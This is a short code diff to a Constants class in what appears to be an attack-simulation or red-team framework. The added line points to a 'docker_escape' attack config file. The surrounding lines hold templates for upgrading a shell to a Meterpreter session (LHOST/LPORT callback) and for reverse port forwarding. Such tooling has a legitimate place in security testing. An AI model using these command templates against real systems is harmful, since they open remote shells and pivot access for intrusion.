@@ -83,6 +83,8 @@ class Constants:
     METERPRETER_PORT=config["METERPRETER_PORT"]
     METERPRETER_UPGRADE= "back\n set TARGET 0\n use post/multi/manage/shell_to_meterpreter\n  set LHOST {}\n set LPORT {}\n set SESSION {}\n run\n back\n"
     ADD_PORTFWD="portfwd add -R -L {} -l {} -p {}"
+
+    TOMCAT_CONFIG_FILE = "../stack/data/attacker/custom_attacks/docker_escape/config_rc.json"
     
 
 
